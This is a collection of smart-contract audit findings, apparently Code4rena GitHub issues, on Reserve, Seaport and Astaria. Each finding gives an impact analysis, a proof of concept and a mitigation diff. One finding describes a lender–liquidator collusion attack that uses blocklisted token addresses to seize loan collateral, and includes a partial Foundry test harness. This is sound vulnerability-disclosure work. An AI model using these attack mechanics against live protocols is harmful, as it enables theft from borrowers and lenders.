([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201)) that the `RecollateralizationLib.basketRange` function returns to be too low.    Before showing why the `assetsLow` value is underestimated however I will explain the impact of the `range.bottom` variable being too low.    There are two places where this value is used:    ### 1. `RecollateralizationLib.prepareRecollateralizationTrade` function  This function passes the `range` to the `RecollateralizationLib.nextTradePair` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91))  Since `range.bottom` is too low, the `needed` amount is too low ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380)).    This causes the `if` statement to not be executed in some cases when it otherwise would be executed ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396)).    And the `amtShort` is smaller than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391)).    In the end this causes recollateralization trades to not buy as much assets as they could buy. This is because the amount of assets is underestimated so the protocol can actually hold more baskets than it thinks it can.    Therefore underestimating `assetsLow` causes a direct loss to RToken holders because the protocol will not recollateralize the RToken to the level that it can and should.    ### 2. Price calculations of `RTokenAsset` A `RTokenAsset` uses the `RecollateralizationLib.basketRange` function to calculate its value:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156)    The `RTokenAsset` therefore underestimates its `low` and `lotLow` prices:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58)    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99)     This then can lead to issues in any places where the prices of `RTokenAsset`s are used.    ## Proof of Concept Here is the affected line:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275)    ```solidity potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume); ```  This line is executed for every asset in the `AssetRegistry` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242)).    So for every asset in the `AssetRegistry` a potential dust loss of `minTradeVolume` is added.    The following scenario shows why this is wrong:    ``` assume minTradeVolume = $50  assume further the following: asset1 with low value $1 asset2 with low value $1 asset3 with low value $1 asset4 with low value $200  Currently potentialDustLoss will be 4*minTradeVolume = $200. So assetsLow = $203 - $200 = $3.  Dust loss should not be calculated with $50 for the first 3 assets. Dust loss for an asset should be capped at its low value. So dust loss alltogether should be $1 + $1 + $1 + $50 = $53.  So assetsLow should be $1+$1+$1+$200 - $53 = $150. ```  ## Tools Used VSCode  ## Recommended Mitigation Steps I suggest that an asset can only incur as much dust loss as its balance is.   If the protocol only holds `$5` of asset A then this should not cause a dust loss of say `$10`.    The fix first saves the `assetLow` value which should be saved to memory because it is now needed two times then it caps the dust loss of an asset at its low value:    ``` diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol index 648d1813..b5b86cac 100644 --- a/contracts/p1/mixins/RecollateralizationLib.sol +++ b/contracts/p1/mixins/RecollateralizationLib.sol @@ -261,7 +261,8 @@ library RecollateralizationLibP1 {                // Intentionally include value of IFFY/DISABLED collateral when low is nonzero              // {UoA} = {UoA} + {UoA/tok} * {tok} -            assetsLow += low.mul(bal, FLOOR); +            uint192 assetLow = low.mul(bal,FLOOR); +            assetsLow += assetLow;              // += is same as Fix.plus                // assetsHigh += high.mul(bal, CEIL), where assetsHigh is [0, FIX_MAX] @@ -272,7 +273,7 @@ library RecollateralizationLibP1 {              // += is same as Fix.plus                // Accumulate potential losses to dust -            potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume); +            potentialDustLoss = potentialDustLoss.plus(fixMin(rules.minTradeVolume, assetLow));          }            // Account for all the places dust could get stuck ```   "}, {"title": "Protocol uses unnecessarily large oracle timeout for assets", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/81", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-39"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/utils.ts#L17-L19 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/1_deploy_assets.ts#L46 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/1_deploy_assets.ts#L60 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L48 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L105 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L526 https://github.com/reserve-protocol/protocol/blob/master/contracts/plugins/assets/OracleLib.sol#L27   # Vulnerability details  ## Impact The protocol implements a safety mechanism to guard against stale chainlink feeds. If the oracle's last response is more than a day ago the contract reverts. But, chainlink feeds are refreshed at set intervals (heartbeat). Most of the feeds used by the protocol on deployment are refreshed every hour instead of daily. With the current configuration, a feed that has been stale for 23 rounds (23 hours) will still be considered valid. The prices of assets are of critical value for the protocol. Minimizing the risk of using stale prices is of utmost importance. Setting the timeout to 24 hours for *every* chainlink feed is an unnecessary risk.  ## Proof of Concept The following token feeds are refreshed every hour: - AAVE 0x547a514d5e3769680Ce22B2361c10Ea13619e8a9 - COMP 0xdbd020CAeF83eFd542f4De03e3cF0C28A4428bd5 - DAI 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9 - USDP 0x09023c0DA49Aaf8fc3fA3ADF34C6A7016D38D5e3 - ETH 0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419  The assets deployed with those feeds set `oracleTimeout` to 86000s, see links to affected code.  ## Tools Used none  ## Recommended Mitigation Steps Set the `oracleTimeout` to a value a little higher than 3600. The oracle is not updated exactly 3600 seconds later so you have to leave a little room for error. For example, the [AAVE/USD](https://etherscan.io/address/0x547a514d5e3769680Ce22B2361c10Ea13619e8a9#readContract) feed is updated after 3624 seconds in between rounds 55340232221128673944 and 55340232221128673945"}, {"title": "StRSR: seizeRSR function fails to update rsrRewardsAtLastPayout variable", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-23"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L374-L422 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530   # Vulnerability details  ## Impact If a RToken is under-collateralized, the `BackingManager` can call the `StRSR.seizeRSR` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141)).    This sends some amount of `rsr` held by the `StRSR` contract to the `BackingManager` which can then be traded for other tokens in order to recollateralize the RToken.    There are 3 pools of `rsr` in the `StRSR` contract that `StRSR.seizeRSR` claims `rsr` from.    1. `stakeRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398)) 2. `draftRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414))   3. rewards ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417))    The `rsr` taken from the rewards is what is interesting in this report.    The issue is that the `StRSR._payoutRewards` function (which is used to pay `rsr` rewards to stakers over time) keeps track of the available rewards to distribute in the `rsrRewardsAtLastPayout` variable ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517)).    When the `StRSR.seizeRSR` function is called (taking away rewards and sending them to the `BackingManager`) and after that `StRSR._payoutRewards` is called, `StRSR._payoutRewards` uses the `rsrRewardsAtLastPayout` variable that was set before the seizure (the actual amount of rewards is smaller after the seizure).    Thereby the amount by which `StRSR.stakeRSR` is increased ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)) when rewards are paid out can be greater than the actual rewards that are available.     ## Proof of Concept and further assessment of Impact The fact that the `rsrRewardsAtLastPayout` variable is too big after a call to `StRSR.seizeRSR` has two consequences when `StRSR._payoutRewards` is called:  1. `stakeRSR` is increased by an amount that is larger than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)) 2. `stakeRate` (which uses division by `stakeRSR` when calculated) is smaller than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526))  Both affected variables can in principle be off by a large amount. In practice this is not likely because the rewards paid out will be small in comparison to `stakeRSR`.    Also after a second call to `StRSR._payoutRewards` all variables are in sync again and the problem has solved itself. The excess payouts are then accounted for by the `StRSR.rsrRewards` function.    So there is a small amount of time for any real issue to occur and there does not always occur an issue when `StRSR.seizeRSR` is called.    That being said, the behavior described so far can cause a temporary DOS:  In `StRSR._payoutRewards`, `stakeRSR` is increased ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)), then `StRSR.rsrRewards` is called which calculates `rsr.balanceOf(address(this)) - stakeRSR - draftRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598)).    The falsely paid out amount of rewards can increase `StRSR.stakeRSR` so much that this line reverts due to underflow.    This can cause DOS when `StRSR.seizeRSR` is called again because it internally calls `StRSR.rsrRewards`.    This will solve itself when more `rsr` accumulates in the contract due to revenue which makes the balance increase or someone can just send `rsr` and thereby increase the balance.    The DOS occurs also in all functions that internally call `StRSR._payoutRewards` (`StRSR.stake` and `StRSR.unstake`):    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215)    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262)    Overall the impact of this on the average RToken is quite limited but as explained above it can definitely cause issues.    ## Tools Used VSCode  ## Recommended Mitigation Steps When `StRSR.seizeRSR` is called, the `rsrRewardsAtLastPayout` variable should be set to the rewards that are available after the seizure:    ``` diff --git a/contracts/p1/StRSR.sol b/contracts/p1/StRSR.sol index 8fe1c3e7..4f9ea736 100644 --- a/contracts/p1/StRSR.sol +++ b/contracts/p1/StRSR.sol @@ -419,6 +419,7 @@ abstract contract StRSRP1 is Initializable, ComponentP1, IStRSR, EIP712Upgradeab          // Transfer RSR to caller          emit ExchangeRateSet(initRate, exchangeRate());          IERC20Upgradeable(address(rsr)).safeTransfer(_msgSender(), seizedRSR); +        rsrRewardsAtLastPayout = rsrRewards();      } ```"}, {"title": "BackingManager: rTokens might not be redeemable when protocol is paused due to missing token allowance", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-25"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77   # Vulnerability details  ## Impact The Reserve protocol allows redemption of rToken even when the protocol is `paused`.    The `docs/system-design.md` documentation describes the `paused` state as:    >all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake  Redemption of rToken should only ever be prohibited when the protocol is in the `frozen` state.    The issue is that the `RToken.redeem` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514)) relies on the `BackingManager.grantRTokenAllowance` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77)) to be called before redemption.    Also the only function that relies on `BackingManager.grantRTokenAllowance` to be called before is `RToken.redeem`.    Therefore `BackingManager.grantRTokenAllowance` can be called at any time before a specific ERC20 needs first be transferred from the `BackingManager` for the purpose of redemption of rToken.    The issue is that the `BackingManager.grantRTokenAllowance` function has the `notPausedOrFrozen` modifier. This means it cannot (in contrast to `RToken.redeem`) be called when the protocol is `paused`.    Therefore if rToken is for the first time redeemed for a specific ERC20 in a `paused` protocol state, `BackingManager.grantRTokenAllowance` might not have been called before.    This effectively disables redemption of rToken as long as the protocol is `paused` and is clearly against the usability / economic considerations to allow redemption in the `paused` state.    ## Proof of Concept For simplicity assume there is an rToken backed by a single ERC20 called AToken  1. rToken is issued and AToken is transferred to the `BackingManager`. 2. The protocol goes into the `paused` state before any redemptions have occurred. So the `BackingManager.grantRTokenAllowance` function might not have been called at this point. 3. Now the protocol is `paused` which should allow redemption of rToken but it is not possible because the AToken allowance cannot be granted since the `BackingManager.grantRTokenAllowance` function cannot be called in the `paused` state.  Another scenario is when the basket of a RToken is changed to include an ERC20 that was not included in the basket before. If the protocol now goes into the `paused` state without `BackingManager.grantRTokenAllowance` being called before, redemption is not possible.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `BackingManager.grantRTokenAllowance` function should use the `notFrozen` modifier instead of the `notPausedOrFrozen` modifier such that allowance can be granted in the `paused` state:    ``` diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol index 431e0796..7dfa29e9 100644 --- a/contracts/p1/BackingManager.sol +++ b/contracts/p1/BackingManager.sol @@ -69,7 +69,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {      // checks: erc20 in assetRegistry      // action: set allowance on erc20 for rToken to UINT_MAX      // Using two safeApprove calls instead of safeIncreaseAllowance to support USDT -    function grantRTokenAllowance(IERC20 erc20) external notPausedOrFrozen { +    function grantRTokenAllowance(IERC20 erc20) external notFrozen {          require(assetRegistry.isRegistered(erc20), \"erc20 unregistered\");          // == Interaction ==          IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), 0); ```"}, {"title": "Incorrect Encoding of Order Hashes", "html_url": "https://github.com/code-423n4/2023-01-opensea-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-01-opensea-findings", "body": "# Lines of code  https://github.com/ProjectOpenSea/seaport/blob/5de7302bc773d9821ba4759e47fc981680911ea0/contracts/lib/ConsiderationEncoder.sol#L569-L574   # Vulnerability details  ## Impact  The order hashes are incorrectly encoded during the `_encodeOrderHashes` mechanism, causing functions such as `_encodeRatifyOrder` and `_encodeValidateOrder` to misbehave.  ## Proof of Concept  The order hashes encoding mechanism appears to be incorrect as the instructions `srcLength.next().offset(headAndTailSize)` will cause the pointer to move to the end of the array (i.e. `next()` skips the array's `length` bitwise entry and `offset(headAndTailSize)` causes the pointer to point right after the last element). In turn, this will cause the `0x04` precompile within `MemoryPointerLib::copy` to handle the data incorrectly and attempt to copy data from the `srcLength.next().offset(headAndTailSize)` pointer onwards which will be un-allocated space and thus lead to incorrect bytes being copied.  ## Tools Used  Manual inspection of the codebase, documentation of the ETH precompiles, and the Solidity compiler documentation.  ## Recommended Mitigation Steps  We advise the `offset` instruction to be omitted as the current implementation will copy from unsafe memory space, causing data corruption in the worst-case scenario and incorrect order hashes being specified in the encoded payload. As an additional point, the `_encodeOrderHashes` will fail execution if the array of order hashes is empty as a `headAndTailSize` of `0` will cause the `MemoryPointerLib::copy` function to fail as the precompile would yield a `returndatasize()` of `0`."}, {"title": "`LienToken`: Lender and liquidator can collude to block auction and seize collateral", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/607", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-01"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643   # Vulnerability details  If a lender offers a loan denominated in an ERC20 token that blocks transfers to certain addresses (for example, the USDT and USDC blocklist), they may collude with a liquidator (or act as the liquidator themselves) to prevent loan payments, block all bids in the liquidation auction, and seize the borrower's collateral by transferring a `LienToken` to a blocked address.  `LienTokens` act as bearer assets: if a lender transfers their lien token to another address, the lien's new payee will be the `ownerOf` the token:  [`LienToken#_getPayee`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909)  ```solidity   function _getPayee(LienStorage storage s, uint256 lienId)     internal     view     returns (address)   {     return       s.lienMeta[lienId].payee != address(0)         ? s.lienMeta[lienId].payee         : ownerOf(lienId);   } ```  The payee address returned by `_getPayee` is used as the recipient address of loan repayments via `makePayment`:  [`LienToken#_payment`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849)  ```solidity     s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount); ```  ...as well as post-liquidation payments from the clearinghouse via `payDebtViaClearingHouse`:  [`LienToken#_paymentAH`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643)  ```solidity     if (payment > 0)       s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment); ```  If an adversary tranfers their `LienToken` to an address that causes these attempted transfers to revert, like an address on the USDC blocklist, the borrower will be unable to make payments on their lien, the loan will eventually qualify for liquidation, and all bids in the Seaport auction will revert when they attempt to send payment to the blocklisted address.  Following the failed auction, the liquidator can call `CollateralToken#liquidatorNFTClaim`, which calls `ClearingHouse#settleLiquidatorNFTClaim` and settles the loan for zero payment, claiming the \"liquidated\" collateral token for free:  [`ClearingHouse#settleLiquidatorNFTClaim`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231)  ```solidity   function settleLiquidatorNFTClaim() external {     IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));      require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));     ClearingHouseStorage storage s = _getStorage();     ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(       address(0),       COLLATERAL_ID(),       0,       s.auctionStack.stack     );   } ```  The lender will lose the amount of their lien, but can seize the borrower's collateral, worth more than their individual lien. Malicious lenders may offer small loans with attractive terms to lure unsuspecting borrowers. Note also that the lender and liquidator can be one and the same\u2014they don't need to be different parties to pull off this attack! A clever borrower could potentially perform this attack as well, by acting as borrower, lender, and liquidator, and buying out one of their own liens by using loaned funds.   (The failed auction liquidation logic above strikes me as a little odd as well: consider whether the liquidator should instead be required to pay a minimum amount covering the bad debt in order to claim the collateral token, rather than claiming it for free).  ## Impact - Malicious lender/liquidator loses amount of their lien, but keeps collateral NFT. - Additional liens in the stack cannot be repaid. These other lenders take on bad debt and lose the amount of their liens. - Borrower loses their collateral NFT, keeps full amount of their liens.  ## Recommendation  This may be difficult to mitigate. Transferring a lien to a blocklisted address is one mechanism for this attack using USDT and USDC, but there are other ways arbitrary ERC20s might revert. Two potential options:  - Maintain an allowlist of supported ERC20s and limit it to well behaved tokens\u2014WETH, DAI, etc. - Do not \"push\" payments to payees on loan payment or auction settlement, but handle this in two steps\u2014first receiving payment from the borrower or Seaport auction and storing it in escrow, then allowing lien owners to \"pull\" the escrowed payment.  ## Test case  This test case needs some additional setup: a `CensorableMockERC20` simulating a blocklist, and a few test helpers modified to handle arbitrary ERC20s instead of WETH:  ```solidity // SPDX-License-Identifier: BUSL-1.1 pragma solidity =0.8.17;  import \"forge-std/Test.sol\"; import \"./TestHelpers.t.sol\";  import {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\"; import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";  contract CensorableMockERC20 is MockERC20 {   address public forbidden;    constructor(address _forbidden) MockERC20(\"Censorable ERC20\", \"CERC20\", 18) {     forbidden = _forbidden;   }    function transfer(address to, uint256 amount) public override returns (bool) {     if (to == forbidden) revert(\"Transfer censored.\");     return super.transfer(to, amount);   }    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {     if (to == forbidden) revert(\"Transfer censored.\");     return super.transferFrom(from, to, amount);   }  }  contract AstariaTest is TestHelpers {    function _createPrivateERC20Vault(address strategist, address delegate, address token)     internal     returns (address privateVault)   {     vm.startPrank(strategist);     privateVault = ASTARIA_ROUTER.newVault(delegate, token);     vm.stopPrank();   }    function _lendToPrivateERC20Vault(Lender memory lender, address vault, address token) internal {     vm.deal(lender.addr, lender.amountToLend);     vm.startPrank(lender.addr);     IERC20(token).approve(vault, lender.amountToLend);     //min slippage on the deposit     Vault(vault).deposit(lender.amountToLend, lender.addr);      vm.stopPrank();   }    function _payERC20(     ILienToken.Stack[] memory stack,     uint8 position,     uint256 amount,     address payer,     address token   ) external returns (ILienToken.Stack[] memory newStack) {     MockERC20(token).mint(payer, amount);     vm.startPrank(payer);     IERC20(token).approve(address(TRANSFER_PROXY), amount);     IERC20(token).approve(address(LIEN_TOKEN), amount);     newStack = LIEN_TOKEN.makePayment(       stack[0].lien.collateralId,       stack,       position,       amount     );     vm.stopPrank();   }    function _bidERC20(     Bidder memory incomingBidder,     OrderParameters memory params,     uint256 bidAmount,     address token   ) external {     MockERC20(token).mint(incomingBidder.bidder, bidAmount * 3);     vm.startPrank(incomingBidder.bidder);      if (bidderConduits[incomingBidder.bidder].conduitKey == bytes32(0)) {       (, , address conduitController) = SEAPORT.information();       bidderConduits[incomingBidder.bidder].conduitKey = Bytes32AddressLib         .fillLast12Bytes(address(incomingBidder.bidder));        bidderConduits[incomingBidder.bidder]         .conduit = ConduitControllerInterface(conduitController).createConduit(         bidderConduits[incomingBidder.bidder].conduitKey,         address(incomingBidder.bidder)       );        ConduitControllerInterface(conduitController).updateChannel(         address(bidderConduits[incomingBidder.bidder].conduit),         address(SEAPORT),         true       );       vm.label(         address(bidderConduits[incomingBidder.bidder].conduit),         \"bidder conduit\"       );     }     IERC20(token).approve(bidderConduits[incomingBidder.bidder].conduit, bidAmount * 2);      OrderParameters memory mirror = _createMirrorOrderParameters(       params,       payable(incomingBidder.bidder),       params.zone,       bidderConduits[incomingBidder.bidder].conduitKey     );     emit log_order(mirror);      Order[] memory orders = new Order[](2);     orders[0] = Order(params, new bytes(0));      OrderComponents memory matchOrderComponents = getOrderComponents(       mirror,       consideration.getCounter(incomingBidder.bidder)     );      emit log_order(mirror);      bytes memory mirrorSignature = signOrder(       SEAPORT,       incomingBidder.bidderPK,       consideration.getOrderHash(matchOrderComponents)     );     orders[1] = Order(mirror, mirrorSignature);      //order 0 - 1 offer 3 consideration      // order 1 - 3 offer 1 consideration      //offers    fulfillments     // 0,0      1,0     // 1,0      0,0     // 1,1      0,1     // 1,2      0,2      // offer 0,0     delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(0, 0);     fulfillmentComponents.push(fulfillmentComponent);      //for each fulfillment we need to match them up     firstFulfillment.offerComponents = fulfillmentComponents;     delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(1, 0);     fulfillmentComponents.push(fulfillmentComponent);     firstFulfillment.considerationComponents = fulfillmentComponents;     fulfillments.push(firstFulfillment); // 0,0      // offer 1,0     delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(1, 0);     fulfillmentComponents.push(fulfillmentComponent);     secondFulfillment.offerComponents = fulfillmentComponents;      delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(0, 0);     fulfillmentComponents.push(fulfillmentComponent);     secondFulfillment.considerationComponents = fulfillmentComponents;     fulfillments.push(secondFulfillment); // 1,0      // offer 1,1     delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(1, 1);     fulfillmentComponents.push(fulfillmentComponent);     thirdFulfillment.offerComponents = fulfillmentComponents;      delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(0, 1);     fulfillmentComponents.push(fulfillmentComponent);      //for each fulfillment we need to match them up     thirdFulfillment.considerationComponents = fulfillmentComponents;     fulfillments.push(thirdFulfillment); // 1,1      //offer 1,2     delete fulfillmentComponents;      //royalty stuff, setup     fulfillmentComponent = FulfillmentComponent(1, 2);     fulfillmentComponents.push(fulfillmentComponent);     fourthFulfillment.offerComponents = fulfillmentComponents;     delete fulfillmentComponents;     fulfillmentComponent = FulfillmentComponent(0, 2);     fulfillmentComponents.push(fulfillmentComponent);     fourthFulfillment.considerationComponents = fulfillmentComponents;      if (params.consideration.length == uint8(3)) {       fulfillments.push(fourthFulfillment); // 1,2     }      delete fulfillmentComponents;      uint256 currentPrice = _locateCurrentAmount(       params.consideration[0].startAmount,       params.consideration[0].endAmount,       params.startTime,       params.endTime,       false     );     if (bidAmount < currentPrice) {       uint256 warp = _computeWarp(         currentPrice,         bidAmount,         params.startTime,         params.endTime       );       emit log_named_uint(\"start\", params.consideration[0].startAmount);       emit log_named_uint(\"amount\", bidAmount);       emit log_named_uint(\"warping\", warp);       skip(warp + 1000);       uint256 currentAmount = 